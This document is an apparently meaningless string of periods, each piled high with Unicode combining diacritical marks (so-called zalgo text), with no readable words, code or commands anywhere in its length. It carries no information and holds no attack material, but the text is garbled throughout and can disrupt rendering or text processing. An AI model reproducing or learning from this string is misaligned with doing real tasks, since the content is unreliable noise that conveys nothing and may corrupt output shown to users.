̯̩ͧ͐̎ͮ̓̽͛͌ͧ̎̌͋̈̏̌̆ͯͩ̏ͅͅ.̶̱̠̯̦͕̱̺̹̮̯͈͙̪̭͕̝̫̘̥̀ͤͮ̂̍ͤ̌̏̓͂̍̈̒͒̉̚͜͟ͅ͏͟.̛̯̗͇̘̲̬̥̙͍̔ͦͩͫ̒ͨ͆ͪ͌ͦ̀ͦͪ̐̈̒̌͋͊̏͟ͅ.̷̶̶̷̷̧̱̲̦̩͓͔̗̝̦͕̘͈͓̞̒͛ͧ̊ͫ́̕͟͟͢ͅ͏̸͜͜͜͢͞.̰̱̺͎͕̦̫̠͌̊͆̈́͐̀͘͜͟҉̷̀̀͟͠͏̴̴̧̡̢͘.̵̶̨̡̮̠̯͙̙͕͉̮̺ͪ̈͋͊̆̄͗̈́͟͟͜͝͞.̷̰͕̗̝͔̮̖̩̥͓̲́̀̕͟ͅͅ.̶̷̴̨̭̦̖̫̗͇͍̮̼͕̱̺͙̱̻̞̱͉ͯͥͤ́͊ͧ͂͗̏̌̒ͬ͋̓́́̚̕͠͝ͅ҉̶̷̧̛͘͢͢͜͡͠҉.̠̟̞̗̪͈̘̏͋̓͗ͨ͝҉̷̶̸̧̧͘͜͞͏̴́͜͠.̩͓̬͚̲̺̙͈͎̝̺͉̩̮̱͓̳̟̮̼ͧ͊̍̋͑ͪ̄͌҉̶̸̸̵̷̛́̀̀̀̕̕̕͡͏̕͘.̷̴̢̧̧̻̼̙̖̙̤̹̹̓̽͌̏̈́̄̊́̕͢͜͞ͅ.̴̵̯͈̮̝͎̮͎̬͈̙̘͚̠͊́̅̓̌̀̅̋̐͆̄ͦ͗̐͗͟͞҉̸͜͡͏̧́̀̕.̶̴̶̢̨̧̛̩̝̩̻͙̥̳̖̳͎͍̙̤̯̃̇͒ͣ̄̀͡͞͞͡͝.̴̶̶̢̧̢̡̧̛̱͈̭̦̼͔̤̯͖̱͇̜ͤ̉́̆ͩͫ͋̕͢͝͠͡ͅ.̼̯̞͈̯̠͍̯̥ͫ́͊̓ͩ͗͒͊̓͌̎͑̔́͆́̓͏̷̡̡͘͟͞͡.̢̬̪̖̬̱̗̦̬.̷̴̸̸̨̨̢̛̬̬͘͞͠͝.̸̪͔͕̞͋ͤ̏͂͏̷̢͘͠͠͏̡̢̢̛̀҉̧.̶̧̥̰̜͚͐̿ͦ̾̄ͯ́͘͟͠͡.̷̨̧̗͕̞̖͕͕̼̱̘̬͍̜̫̼͔̻̥͖̺̈ͦ̀̃ͥ͋̍͘͟͠͝҉͏̧̡̕͢.̴̴̛̩̅ͬ̂͗ͫͤ̓́̚͏̶̷̧̡̡̕̕̕͝͠.̷̵̵̧̢̥̻̬̱̭̰͈̠̫̣̟̱ͪ́̇̅͒ͦ͗ͧ̑̈́̉͢͜͠͠ͅ.̢͔̗̠̞̖̹̠͑͌ͭ̂̔̀͂͊̋̋̀̚̚҉̵̴̧̛́͘̕͘͜͞҉̨͘͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.͎ͫ̆̕҉̴̴́͟͏͜.̷̛̛̛̖̭̼̘̤̜̖̣ͥ̓̇͑̑͛̏̕͟͢͟͞͠͠.̵̻̞̳̪͉̘̤̣͉̘̣̦̬͙̖͟͝҉̵̸͟͢͠͝҉̸͏̨.̶̶̸̶̧̢͕͙̞̪̗̰ͥ̒̅ͣ̾͛ͭ͂̏͘͘͡҉̵̶̵̧̀҉̶͟.̧̢̛̟͉̞̭̱̯͕̘͗͐̔̓̊̄ͭ̉ͫ̚͘͟͜ͅ͏̷̵́͟͟͝͞͝.̷̶̷̛̰̲̘̬̍̉̔ͤͬͭ̔̓̄͑̊̌͑̄̓ͭ̾̏͒͒̕͞҉̵̵̧̛́̕͟͟͞.̸̸̷̸̢̧̡̛̛̹͍̦̝̼ͮ̄͛̄̀́́͝͡.̧͔͓̭̳̞͔̦̬̙̦̥̳̻͚̩̹̲̰̟͒̓̿̊͆̿̒̓̎.̟͙̦̼̯̥͔͚̹͚ͧ̏̄ͭ̀̓̑̇͆ͣ̅͊̚.̥̥̯̱̣̜͓̞̱̯ͨͣ̽̾ͨ́̀̕͞͝͏̶̴̡͜͜͏.̶̸̵̸̢̢̢͙̞̫͙̭̩͖̭͊̇̓͘͘͟͜͢͡͝.̶̹̖̥̩͚̬̝͕̙ͨ́͜͡҉̷.̷̵̈́̂̇͑̄ͫ͒́͋̕͟͟͠͞͠͏.̷̹̰̮̼̮͓̰̪̘͔͚̰͓͚̯̠̋͌ͧ͛ͭͭ̀̐͋ͣ͋̉̉̊͏̶.̴͉̙̪̝̙͕̣̦̲̫̼ͮͬ̊̃̓̍ͨͯ͑̋ͩ̊͛̕.̷̡̧̢̛̙͕͎̪̬̤͕ͤ͊͐ͤͩ̂̽̇ͪ͐̑ͮ̄̚͢͡͝.̶̡̧̨̛̦͖̝̖̹̺͓͈̜ͭͥ̒́̕͘͘͘͜͡͡͡͡͏̶.̡̘̮̗̻̣̱͍̖̦̩̟̝ͪ͐̓̄̓̔͟҉̷̢́͏̶̢̧̕͝.̷͇̼̻̺͔̻̩͚̣̖͖̝͙͓̺̾́̍͌̓ͭ̌ͨ̾͌̈̓́̂ͤ̉̚̚͡ͅͅͅ҉.̡̭̻̘̮̩̬̑̅̌ͧͨͬ́̾̔̓ͪ͆̍ͣͮͬ̀̚͞ͅ͏͏̵̡̛͜͞͠͏͜.͕͇̄̈̐̈́̀҉.͇͎̞̜̠̙͎̮̦̥̙͚̥͔̥̅͆ͭ͂̃̍ͪ̀.̶̴̵̶̶̧̛̻͖͇͙̳̲̟̱̜̞͔̬̥͈̠̳͍̱̜̮̌̓ͧ̓ͫ͛ͪ́̕҉̢̕͏̵͠͡.̶̨̜̦͓̤̟͚̣̪̦̞͕̤̙̾ͪ͗́́̃́͢͠͞.͇̪̇̃ͩ̿͌͊̐ͮ̋̐͊̑̚͟͟ͅ͏͏.̧̡̰͖̙͍͍͇̽͜͡.̵̸̡̧̛͚̞̼͕̞̠͖̙̭͚̥̪̥̳͛ͩ̄̇ͯͤ͐͆̔̈́͐ͮ͛̀͘̕͢͜͜͜͜͡͝͡ͅ҉͟͏.̸̷̡̢̨̧̯̦̻̳͌̿̆̌͋ͯ̀̏ͥ͛̐̊ͨ́̚̚̚̕͞҉̷̴͠҉̡.̶̨͈̅̈́͒ͣͦ͒̽ͪͮ̒̽͂́̈́ͫ̏̉͐̚͜͠.̷̡͉̙̪̥̰̳̰͚͍͐̎̉̇.͇͎͕̳̳͕̊̓͂͑ͧͬͯ̍ͧͩ̚҉̴҉̶̶̢̧̧̧̡̢̛̛̕͜͢͜͠͡.̢̠̿̃̾ͬͥͭ́̚.̴̴̴̸̢͈̰̖̞͚͉̲̰̮̙̳̮̞͇ͯͥͩͨ̒ͮ̅ͭ̓͗͌͆ͮ͂͂ͭ̋ͨ̾͊͘͘̕͢͠͠͡͞.̭̼͉̗͇̺̙̩̱̖̥̏͒͑̇̊̓ͯ͒̄̈́̇.͖͕̙͕̹̘̖̻̯͐̾͐̇͒̿ͧ͢͡҉̧̨.̖͕̞͈̣̯̬̮̫͈̠͖̘ͦ͑ͩ̏ͥ̀ͬ̎̃̔̓̆̅ͬ̀̚̕͢͡ͅ.̶̴̸̠͕̟̩̜̦͓̘̓́͌̌ͯ̌̆ͯͨ̈́̈́̎͂͆̀̚͘͜͟͏̵̴̵̨̢͢.̸̴̨̨̫̣͍̬͓͚͈̺̹̥̜̟̦̺̼̈ͨ́̓ͣͧ͗̇ͩ́͘̕͢͞͠͠͝ͅ͏̶̵̸̢.̶̡̱̖͚̘̩̝͙̣̺̦͇̠̝̠͈̯͉͓͙̟͌͊ͥ̒ͥ͋ͨ̇̌̈́ͭ̿̅̌ͪ́͘͠͡.̵̢̡̨̨̛̯̟̩̘̙̘̽̎̀̆̉̉͋ͣ́͌̊̂̾́͘͜͟͝͠͝͡͠.̷̡͔̩̝̼̬̪̰̜̼̯̠͍̻̼̥͇̑̋ͣ̏͋͟͡ͅ͏̴̶̶̡̢̡̧̧̢́̕͢͢͜͝.̵̛ͣ̾̊́̂͐̊̈ͫ̒̿͗͗͊̔̓͋͋͂͡͡.̗̭̼͍̹̯̞͈͎̯̼̗ͪ͒͒̌ͬ̈̃ͬ͊ͫͤͅ.̨̢ͨͪ̉͊̉ͪ̾̄ͮ͋ͣ̋̌́ͬ̅͗́ͯ͢.̷̴̴̷̶̡̨̢̛̠͔̮̭͚̝̰͌̌̏ͬ͒̀͑̉̂̒̽́̕͟͜͢͞͝͠͞҉.̵̵͔͑͆ͧ̓̓ͧͧ́.̴̡̨̛̮͖̥͎̜̗͔͎̪̙̪͐͐ͬ͌̇̌̓͋̎̂͛͑̆̄̐̐͊ͪ̀̀̕̕͝͡͠.̙̱̝͍̤̖̰̱̈́̆͗ͪͥ͑͆ͪ̄̎ͩ͂̒ͪ̈́͑̓̎̿̌̕͡҉͢͡҉̶̧̧̨̛͟͟͠͝͏̵͝.̴̢̨̙̼̖̟̫̲̘̥͇̇͘.̼̘̫̦̹͖̲̺̱͚̜̟̣̜͍̊́ͥ̔̇̓͒͒ͮ̉ͨͮͨ͗̐͛ͅ͏̸̵́͡.̦̤͙̰̝̯͇͈̟̻̝̟͕͚͇̗̲͍̾̆͆́̃ͬ̐̅̚͏̸̧̧̛́͘̕͘͘͜͠͞.̟͎͔̦̫͚ͦ.̷̷̶̰̙̩͎̞̟̬̣͕̻̟̳͈̰̽͐͛ͥͨ̾͛̊͆͒̒̅ͣ̾̊͑ͬ̐̒͘͟͟͟͠ͅͅͅ҉̕̕͘͏̸͠.̴̷̡̨̟̲̩̙͙̩̻̱̋ͅ͏͏̶͏͠.̭̥̙̖̹̩͔̼̞͉̣̱̭͗ͥ͂͒͊̏̐̃̏.̵̷̨̟̠̖̤̮͙̙̟̻̮͕̻̬͙͉̞̙̎͆ͮ́҉̸̡̛̀̕͘͜͟.̵̛ͩͧ̌̓ͮͮ̎͒̀͜͝.̸̶̬͈̻̖̜̳̹̜̯̯̖͚̝̟̪̻͔̳̃ͤ̓͌̒̾̀̚͢͟͠.̠͎̦͚̣̺̪̼͚̝̗͕̻͓ͬ̇̇ͧ̑̎͐͞.̷̴̴̵̴̴̭͕͓̥̫̜̹̼̞̗̈́ͨͧ̐̓̌ͬͫ̈̎̐͂̀̀͟͜͢.̵̨̡͈͉͙̺̭̝̪̖̱͆ͬ̅ͦ̋͂̌̂̽͛ͭ̓͛̓̽ͪͩ̇̈́͑͟͢͢͡͠.̶̵̢̢̡͉̖̺̲̫͎̣͇̙̯̰̬̰̩ͤ̏ͮͫͫ͊́̋ͯ̿̏̓̄̇̉ͦ̎̑ͦ́̕͟͟͞҉̛̀͘͞.̷̨̡̧̡̗̳̞͎̟͇̭̦̮̬̙̃̑̀̓̒̌ͨ̉̂ͩͮ̇́ͨ̈́̀̀̀́́̕̕͟͜͜͡͝͝.̖̬̫̹̪̜̠̦̹̤̹̪̋̔ͬ̎ͤ̓̋̊͛ͤ̑͋̚҉̴̵̷̶̡̡̛̀̕͘͟͟͡͡҉̨͘.̵̶̵̧̧̛̗̘͚̝͓̰̭̫͎̠̜͔̗̅͐̅̃̓͋̀ͨ́͘͟͟͜͠͡҉̵͜͝.̓ͫͦͫ̄ͨͬ̔͑̎̏̅̍͂́ͤ̚.̸̓͗ͪ͂ͮ̂̑ͮ̑̀̕̕̕͢҉̵̸̨҉.̸̷̳̟̓̿ͧ̂̄ͮ̽ͮ̄ͦ̃́͋̒̚͏̴̢́́͘͢͢͢͜͞͡͡͏.̶̸̢͚̂̋ͫͬ͊̋ͬ́͊͌̅̍̍̂͆̊̈̚͏̷̡̧̢͟.̵̧̦͔̽̿ͣ̿ͣ̈͂̀.̷̭̝̞͈̌̉̚ͅ͏̷̷̧̧̛́͘͢͠.͔̤̺͚̖̜̲̝͍̓ͤ̊ͨ̅͑̎͜ͅ͏.̸̶͇̣̭̬̭͓̏ͬ͊̿̕͠҉̷̡̢̛̀͘͟͏̴.̨͕ͩ̓͋̿͛̏ͤ͛̋͆ͤ.̳̪̫͉̺̥͇͚͔̝͕̭͈̹̳̩͈̂͠.̷̸̨͖̖͍͙̪̥͙̤̣͚̅ͥ̈̓ͥͩͦ̋ͦͯ̈ͣͧ̈́̕̕͏҉́.̖̋̒̒ͮ̈͐̂̍͊ͨͯ̅͒ͦͣ̒̃́̚͢͡͠͏̶̨͏̶̶̧̧͘̕͡͡͡.̵̥͈͈̘͉̗͔̘̰̱̟̗͖̳̺̭̫̱̰̬ͨ̓̐͂̾ͪ̂̄̓̄͋̔̎̑͟͏̕͏͘҉̡́͠͏̸̵͘͠.͈͉̪̲͚̠͓͖̼̟͚͛ͭͭͭ͂ͫ͑̈͑ͮͦ.̡̧̥̺̗͕̲̥͎͎͔̠̞̤̠̯͚̟̥̥̹ͫ͛ͧͧ̿̓ͫ̅́͝͏̸̷̸̵̢̢̛̀͢͜͟͠͡͞͡.̶̸̷̢̨̛͎̘̭̟̰̩̍̅ͣ͊ͫ̋̄͆̈̋̎̓̒ͩ͐͛ͤ̂́̀́̚͢͠͞.̸̸̶̡̛̥͚̹̩̱̮́ͫ̃ͩ͒̆ͧ͟͜͡҉̴͡.̺̟̥͙̼̆͋̍͛̌̂ͪ̀̈́̓̊̓́ͅ҉̕͢͢.̴̡̡̢̡͎̲ͮ̎͑ͧ͑ͫ̂ͬ̊͌͘͢͞.̸̴̶̶̡̬̤͈̹̰͌́ͨ̿ͨ͐̀̕͢҉̸̨̛̛́͜͜͞͡͠.̶̵̛̰͖̹̮͍̬̫̭̤̪̲͇̤̰̗͆̊̽̌̐̾ͪ̄̐̽̃ͤ͑̀͏͏̡̛̛͢͜͢͜͞͝͞.̷̸̨̢̨̖̘͊ͦ̑͐ͩͪ͝.̲̘̮̝͎̦̖̬́͟͏҉.̨̡̠̳͓̘̟̰͚̠̝̉ͣ͌͐̀̈ͯͨͣ̽̽̽ͫ̀̕͏͏̷͜.̸̨̛̛̪̍ͣ̒̿͛ͨ͗̂͛́̾̾̇́̿̚͘̕.ͨ̓ͥ͐͌ͣ̓̒̌̆͏̸̴̶̸̷̸̧̛̛͜͡.̸̧̡̢̛̤̘͖͈̱̫̭̯̬͔̞̻̯͎͙̝ͣ̏́̽̔ͯͤͪ̑ͥ́͘͜͟͠͝͝͡͏̨̛͝͡͞.̷͇̫̻̻̣̥̗̘̪͖̯̂ͨ͒̆̅̋͛͋̋̓̂́͛́̉̀̕͜͡͏̷̧͝.̸̛̥͇̟͕̳͈̜̟͖͎̬̼̤͎̠̓̓̌͗̔̉̽ͦ̍̇͗̇̈̅ͥ͛̒ͩ̾ͦ́́͜͝ͅ҉̵̵̢҉̵̸̴̵̡̛͜.̴̵̸̵̧͕͕̼̺͉̝̫̭̓ͯͮͫ͐̃̕͠҉͏̸̢͢͟͠͞͠.̵̷̡̜̻͕̭̽́ͯ͛͗̈̍͆ͮ̂̊͌͂ͬ̾ͤͧ̋ͦ͡ͅ.̖̠͔̘̲̳̍ͦ̾̊͟͠.̵̨̡̨̙̥̳̠̬̜̬̹̙͉̳͂͋́ͩ̐͋̈̈̽̓̃ͧ̀͠.̵̷̴̥̱̘̮̤͓̙̻̠̹̳̙̤͔̖͗̀͢͡͡͏̴̛͟͡҉̸̧͜͢.̶̵̻̘̤̽̇̃̏͊ͤ̒ͥͥ͂̂̈̊ͧ̌̀̚͠҉̸̧̢̕͘͟͟.̴̨̟̣͙̝̹̗͍̮͚̱͕̝̹̤̃͑ͪͦ͆͂ͥ̉̽̎̒̓̓̓̾̀͟ͅ͏̴͟͝͏͡͏̷҉̴̶̢̛̛́͜.̵̷̢̛̝͙͓͎̲̣̗̯̗̰͈̻̪͇̺̾͒́͘͘͢͜͠.̷̢̘̪͍̭̭̩̳͖̱̻̣̰̞͔̳͙̝̣͍̦̐̒̇̍ͩ̍ͦ̑̇͌́̾ͦ͌ͮͨ́́͘̕͝͠͝҉̸̴̛̛͝.̷̸̳͙̫̮̲͈̬͖̖̟̪͉̃͋ͨ̋̑͆̅͛̾͜͜͜͜͞͠.̵̷̴̢͍̺̺̦̓ͫ͂ͥ͂͠.̶̝̱̺͓̳̭̻̞̟̦̼̖̥͔͙̠͇̆͠҉̶̷̶̷̡̨̨̛͘͘͟͡͡.̵̵̶̙̳̜̤͇̜̟̯̠̗̤̥͖ͣ̉̅̈́̊ͫͧ͌̄̌ͭ͑ͤ̍̃ͪ̉̉ͫ̀͢.̷̮̼̳͓̪̘͉͚͇̳͖̬̺̭͎̈̒̊ͪͪ̋̂́̑͗ͮ̄̑ͮ͝ͅ͏.̶̷̧̻̙̙̮͖͍͋̇́ͭ͛ͩͫͧͫ̾ͮ̔̚͜.̶̜̾͂͐͆̿̎̽͏̡̀̕͘͢͟͞.͕̱͉̖̰̝̩̲̖͋̄̈́̐ͧ͂̌̀̅̉̆ͣ̓̎̄̑̌͏̛͏̴̸̶̴̴̨̨̛̛́͘͜͡͡͠.̴̵̮̼̺̣̺̩̭̱̞̻̺͙̊̃̃́͟͢.̡̧̧̛̛̠̳̩͓̝̭̠͈̠̰͖͔̯ͨͩͯͯ̋̔ͯ͂͆̾̾ͫ͆͑́́͘͘͘͢͟͜͟͠͠͝͡͠ͅͅ.̷̸̢̛̠̀ͩ̄ͩ̀́̀͜͡͞͝͞.̜̎̂̃͏̶̵̧́́͜͝.̵̖̩͉͎̟̮̰̪̼̪̱͒̿̓ͭ͆͛̆̓ͦͯͪ͒ͧͣ̅̆ͬ͝͡͡ͅ҉̶̷̨̢̡͘͢͟͞͠.̷̶̣̤̟̹̥͙͍̟̹̉͂ͯ͐̒̈́ͧ̐́ͧͣͬͤ͋͏̸̷̵̷̵̢̨̢͘͜͝͝͞͡͞.̸̸̻̞̭̓͌ͬ̿̈́͗̃̇̒̉̋̚͠͡͡.̶̷̴̡̛͖̪̝͕̲͍͎̣͙͈̦̹̫͎͓̖́̎́̀́͟͡҉҉.ͮͫ̽͏̵̴̸̢̨͜.͔̱̖͓̻͓͙̺͎̲͕͚̤͔̪̜̘̮͈̓̓ͭ̂̉̾͐̑̆ͩͯ͑̐̎.̸̶̲̦̙̹̘͔̞̭̙͎̲͖͕͚͖͔͙̭̫̻̄ͣͫͨ͂̂͜͜͜҉̶̧̢̧̕͟͠҉̸͘̕.̵̵̧̧̧̢̧͓̩̪̹͔̲͎͈̠̼͔̯̖̮̙͙͛̓ͮͪ̕͡.̢̧̹͕͉̝̫̟̬͎̩͚͙̬̰͖̗̳̳ͤͯͬ́ͨ̋ͣ̈̎ͣ̉̋̚͘ͅ҉҉̷͏̵̴̡̨̛͘͘͟͟͟͞͞.͕̞̬̜̞̥̩͙͚̔ͮ̓̃̍͗͊̃̿ͧ̋̉͆̑ͫ͋͐̈͠.̷̞̫̂ͩͧ̈͆̋ͬ͐͞҉̶̴̵̡́̕͢͢͝͡͞҉͟.̵̵̡̨̡͓̳̞̟̖͉̠̝͇͇̰̰̱̠̩̤̭͈͌̅̂́̄̿ͪ͟͝͡͝͠ͅ͏҉̸҉̶͠͞҉͡.̛̮̳̱̗̞͕̺̩͈̖͎̹͔̣̜̺̋͆̒̆̋̋͛͋̃̎̆ͦͣ͊.̳̘̱̭͛̓͂͊̓ͣ͊͌́͌̎̓͗̂̄ͧͨ̿̄ͧ.̸̰̩̤̟̱͖̭̱̞̰͇̟͋͛̄͂͊ͫͭ̈ͭͤ̔ͤ̐ͯ̈́͋̌͟ͅ͏҉̨͠.̧̛̣̭̣͍̩͎̻̫̗̖̟̖̮͖̑̇̅͑̂̆̉ͤ͑̅́͡͞.̵̴̨̨̨͚͚̘̜͚͚̲͎̪͈̥̱͓̰ͬ͛ͧ̑̌̌ͮ̈́͒ͭ̊̑̃́͑ͨ́́̕̕͜͟͝͞҉̶̨͡.̸̨̛̣͙͎͙̝̹͉͔̤ͯ̏͊̏͆̌ͩ̅̉͂̉̆̈́̿͋̄ͦ͞.̵̡̢̢̛̛͈̼̝̻̣̼̮̖͕͊̆̔́͟͝͏̷̶̴̨͘.̶̴̡̨̛̖͖̙̲̩̝͚̥͈̬̲͐̾͒̅̓̏̓͢͡͡.̷̧̟̳̺͕̬̦͚̳͎̮͓̤̟̙͖̮̩̮̀̉̈ͫ̓ͧͭ̚͟͝͏̷̸̀͘͞.̶̸̧͇̱̙̬̘̺̩̟̙͊ͩ̓ͩͭ͐̃̋̓͊̈͗͒̓̀̕͘͘͟͟͠͡ͅ҉̡́͞͏̵̵̢̧.̷̷̵̧̢̠̫̖̼̣͎̘̊̐̐͂ͭͧ̇ͣ̒́ͩ͆̚͏̛̀̕͜.̢̧͍̗̣̦̖̣͜ͅͅ͏̶̡͢͏̶̶́́͘.̵̻͓̺͍̺̜̦̟̽̅̈ͤ̂ͯ̓͋̂̇͜͏̨̛́͘͜.̵̷̸̡̨̢͉̟̣̖̑̍̿̉͂̄̏͐ͪ̀̕͟͞͡҉̸̷̨́͟͠.̶̵̡̧̨̛̛̤̳̎͛̾̉̀ͯ̿̌͗͌̎ͣ͂͒́͜͟͟͡͡ͅ.̤̺̣͕̣͙͚͚̫͎̉͆̃ͧ͆̽́ͥ̇ͩ̄̋ͧ̽ͣ̊̚̚ͅ҉̶̨̢̀҉̨͘.̷̷̸̥̫̬͉̭͖̙͍͓̣̞̤͖̙ͩͧͣ̏̉̃̔̊͐ͯͭ̾̒̅͟͞͏̶̴̡̀͞͡͞҉̵̴̡̛̛͠.̰̣̤͍̻ͪ̅ͥͯ̏̐̓̒̀.̴̵̟̩̱͚̼͇͉̗̫̣ͭ̈̌͞҉̷̶̸̵̀͜͠҉͠.̴̡̡̡͉̮̣̞̙̻̤̠̬͕͙̗͍̝͍ͣ̑̇̃ͭ̎̎̅ͮ̀̄̊̕͠.̴̻̗̜̗͎̘̲̣͖͔̠̣̯ͩ̓̄͂ͬ͑̓͆̓̅ͮ͊̀̚͏̢̨̛͟͝͏̢̕̕͡͡.̶̷̨̘͕͉̞̰̫͍̇ͨͣ̃͌͗̓̊̉ͨ̃̒͋͐̓̈̐̏̏̾̕̕͜͟͠͏̷̛́.̶̶̫͇͑̄ͬͮ̑̽̽͜͜͝.̵̷̶̵̢̨̬͕̩͉̜̠̱̲͖̖̗͕̠̳̩͓̐̈́̓͋̈́̎ͣͭ̌͆̀̕͘͢͢͢͢͞͝͡͞.̴̨̧̡̛͇̳͖͈͓̤͓̹̪̺̇̎̅͑͗ͨ̈̆ͭ͛ͪ͊́̀̀͟͝͠͞͞.̞̣̦̠̟̍͞.̫̰̲̯̗̫͉͚̗̺͓̟̫ͩͤ͋̒͋̌ͣ̈̽̊̐́͢͞.͔̘̘̪͈̲̤͓͍̰̺̮̞͚͎̫̙͒ͫͥͬ̓ͣ͗̓ͭ̑ͭ͒͂̐̑̾ͩ́̽̚.̙ͤ̇̈̄̾ͯͯͥ.̨̪͕͎͈̪̳͚̫̱̞̼̤̫̖͍͇̯͂̍̈ͨ͑͒ͪ̌͋͗̈̄͊̏̆ͭ̀̑̄́͘͘͢͠҉̸̸̵̨̛̀͜͢͞.̷̡̱̻̗͚̼̣̪͖̿͌̄͛̈́̏̈ͣ.̵̴̵̷̸̨̧̞̗̺͕̰͈̻͍̟̩̯̞̻͟͟͠͏̷̨̡̀͜͟͜͝.̴̨̡͔͉͕͈̗̜̲̞̩͈̯̫̻̙̻̣͖̙̮̋ͦ̓ͨ̍ͪ͐͒̓ͨ̇̄̆̇́̓̔͗̔̀̚͢͞͝͞ͅ҉̶͏͟͟͞͝.̣͙̣̞̭̹̫͖̮̻̟͇̺̞͖̥̎ͨ̒͑̍͆ͤ̾̉̔͑́ͫ̒̿̓ͭ͏̴̷̷̢̕͟͜͡҉̨̀͘҉̢.̶̷̶̛̭͓̫̰͔̩͕̭͓̦̪̗̎̄ͥͮͮ͆̍̈́͐̾͂̾ͤͩ́̀͠͡͝͠͞.̸̶̶̶̵̨̧̪̹̞̺̜̖͙͓ͫ̀́̕͢͜͜͠͡͏̀̀͢͞҉.̷̷̵̷̵̷̧̢̧͎̝̝̝̱̪̤̞͚̖̘̜̋̋̊ͮ͋̒̒̌ͫͦͪ̈ͧ̊̓͌̀̆ͭ̀̀͘͟͠͡͏̢̧̡.̸̨̧͓̫͉͉̰̱͒̍ͧ̈ͯ̔ͪ̄́͝͞͡͏̸́.̶̸̷̨̨̨̨̧̛̲̥̖̗̰̟͇̍̑̑͋̀̇͆̊͒̆͂̈́́̕͘͟͡͞͠ͅ.̷̛͚̳̩͇̪͓̞̜̘̠̯̠͓͓͈̦͇̝͝͝ͅͅ҉̷̢̧̛.̴̦͉̦̪̮͍̱͎̮̱͕̲̦̥̣͇̪̪̂͒͋ͪͩ̔̌͘ͅ͏̷̧̀́̕͘͠.̴̵̢̡̛͎͇͍͇͍̝̮̜̝̭̱͎̜͉̥̞̗͓͌͐̿̒ͯ͂͂͊ͮͭ̃̓̑̈́͆̃ͫ́͢͟͞͝͡͝҉̴̶̕.͉̤̮̱̼̺͈̒ͬ̄́ͬ̌ͭ̆ͫͦͫ̑ͦ͝͠ͅ.̶̵̡̢̛̪͓̱̯̈́ͥ̄ͤͫͥ̃ͦ̈̒̾̃̾ͬ̏ͯ̏́ͫ͜҉̸͘.̶̳͎͈͎̬̠̦̳̭̥͇̯͕ͥͧ͗͂ͫ̅̂͘͞͠ͅ҉̸̵̢̕͟͢͢͟͞҉̷.̵̧̢̢͂̄̿ͣ̒̌ͤ́̚̕͜͜͠҉̴̷͏͏͏̸̧.͎̻̳͕̠̭͇̮͂̃̅̀̓ͯͥ̒̊ͮͮ̈́̂̋́͠͠͝͞͝.̛̳̙̣͔̤̮ͧ̉̇ͧ͑́͌ͭ̊̍̀̇̆͛̃́̏͆͏̧̢̨͝҉̛҉̴̢҉̷̷̶̡͠.̷̵̵̶̨̡̡͎̬̟͖͉̞̖͉̑̒̊̉̾ͨ̓̅͛ͦ̊̾ͬ̐̅́ͪ́̚̕̕͜͠͝.̸͚͎̲̫̠̳̐̍̄͑̍͛ͩ͛ͧ̌̚͠͡ͅ.̶̢̡̛͔̞̲̬̦͔̘̭͋̎͂̔ͮ͋̆̀́͢͟͡͠͡.̴̸̡̡̧̨̛̛̛̛̛̪̠̭̣͔̘͙̼̤ͣͭ̈̅̀́̕͜͝͠.̷̸̨͉̟̭̜͕͓̙̳͙̗ͮ̊̔̇ͩ̃͛͑ͬ̔̍̈́̔ͭͣ́͜͞.̷̘̣̖̲̻̦̤̣̜̩͖̥̜̱̞ͣͪ͆̅̄̆̓͒ͣ͂́ͧ̍̊ͫ͘͏̨̡͘͟͡͏͏̡͢.̵̴̷̴̰̕.̵̶̨̧̡̛̛̛̭͚̙̰̫̥̹͖̿͟͢͟͝͝͠ͅ҉͜.̸̴̴̢̢̛̘͉͖̭͔͓̯̼̗͕͔͇ͤͪ̃͂̂̌̍̍̆͑̀͟͢͝.̙̯͖̝̠̯̎ͥͧ͗ͥͧ͑͆ͤ̿͊͋̾̆ͨͯ